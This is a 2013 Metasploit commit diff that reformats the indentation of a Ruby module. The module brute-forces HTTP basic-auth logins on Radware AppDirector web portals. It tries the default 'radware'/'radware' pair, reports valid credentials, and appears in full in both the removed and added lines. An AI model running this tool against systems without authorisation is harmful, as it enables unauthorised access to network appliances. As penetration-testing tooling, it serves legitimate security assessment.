5613cfb249e9ac5b7b6ad7575e6cdde28daa5416
jvazquez-r7 <juan.vazquez@metasploit.com>
2013-10-21 15:57:23 -0500

    Retab changes for PR #2455

--- modules/auxiliary/scanner/http/radware_appdirector_enum.rb
+++ modules/auxiliary/scanner/http/radware_appdirector_enum.rb
@@ -1,122 +1,120 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::AuthBrute
-	include Msf::Auxiliary::Scanner
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::Scanner
 
-	def initialize(info={})
-		super(update_info(info,
-			'Name'           => 'Radware AppDirector Bruteforce Login Utility',
-			'Description'    => %{
-				This module scans for Radware AppDirector's web login portal, and performs login brute force
-				to identify valid credentials.
-			},
-			'Author'         =>
-				[
-					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-				],
-			'License'        => MSF_LICENSE,
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Radware AppDirector Bruteforce Login Utility',
+      'Description'    => %{
+        This module scans for Radware AppDirector's web login portal, and performs login brute force
+        to identify valid credentials.
+      },
+      'Author'         =>
+        [
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
+        ],
+      'License'        => MSF_LICENSE,
 
-			'DefaultOptions' =>
-			{
-				'DB_ALL_CREDS'    => false,
-				'BLANK_PASSWORDS' => false
-			}
-		))
+      'DefaultOptions' =>
+      {
+        'DB_ALL_CREDS'    => false,
+        'BLANK_PASSWORDS' => false
+      }
+    ))
 
-		register_options(
-			[
-				OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true]),
-				OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'radware'", "radware"]),
-				OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'radware'", "radware"])
-			], self.class)
-	end
+    register_options(
+      [
+        OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true]),
+        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'radware'", "radware"]),
+        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'radware'", "radware"])
+      ], self.class)
+  end
 
-	def run_host(ip)
-		unless is_app_radware?
-			return
-		end
+  def run_host(ip)
+    unless is_app_radware?
+      return
+    end
 
-		print_status("#{rhost}:#{rport} - Starting login brute force...")
-		each_user_pass do |user, pass|
-			do_login(user, pass)
-		end
-	end
+    print_status("#{rhost}:#{rport} - Starting login brute force...")
+    each_user_pass do |user, pass|
+      do_login(user, pass)
+    end
+  end
 
-	#
-	# What's the point of running this module if the target actually isn't Radware
-	#
+  #
+  # What's the point of running this module if the target actually isn't Radware
+  #
 
-	def is_app_radware?
-		begin
-			res = send_request_cgi(
-			{
-				'uri'       => '/',
-				'method'    => 'GET'
-			})
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-			vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
-			return false
-		end
+  def is_app_radware?
+    begin
+      res = send_request_cgi(
+      {
+        'uri'       => '/',
+        'method'    => 'GET'
+      })
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
+      return false
+    end
 
-		if (res and res.headers['Server'] and res.headers['Server'].include?("Radware-web-server"))
-			vprint_good("#{rhost}:#{rport} - Running Radware portal...")
-			return true
-		else
-			vprint_error("#{rhost}:#{rport} - Application is not Radware. Module will not continue.")
-			return false
-		end
-	end
+    if (res and res.headers['Server'] and res.headers['Server'].include?("Radware-web-server"))
+      vprint_good("#{rhost}:#{rport} - Running Radware portal...")
+      return true
+    else
+      vprint_error("#{rhost}:#{rport} - Application is not Radware. Module will not continue.")
+      return false
+    end
+  end
 
-	#
-	# Brute-force the login page
-	#
+  #
+  # Brute-force the login page
+  #
 
-	def do_login(user, pass)
-		vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
-		begin
-			res = send_request_cgi(
-			{
-				'uri'       => '/',
-				'method'    => 'GET',
-				'authorization' => basic_auth(user,pass)
-			})
+  def do_login(user, pass)
+    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    begin
+      res = send_request_cgi(
+      {
+        'uri'       => '/',
+        'method'    => 'GET',
+        'authorization' => basic_auth(user,pass)
+      })
 
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-			vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
-			return :abort
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
+      return :abort
 
-		end
+    end
 
-		if (res and res.code == 302 and res.headers['Location'].include?('redirectId'))
-			print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
+    if (res and res.code == 302 and res.headers['Location'].include?('redirectId'))
+      print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
 
-			report_hash = {
-				:host   => rhost,
-				:port   => rport,
-				:sname  => 'Radware AppDirector',
-				:user   => user,
-				:pass   => pass,
-				:active => true,
-				:type => 'password'
-			}
+      report_hash = {
+        :host   => rhost,
+        :port   => rport,
+        :sname  => 'Radware AppDirector',
+        :user   => user,
+        :pass   => pass,
+        :active => true,
+        :type => 'password'
+      }
 
-			report_auth_info(report_hash)
-			return :next_user
+      report_auth_info(report_hash)
+      return :next_user
 
-		else
-			vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
-		end
+    else
+      vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
+    end
 
-	end
+  end
 end
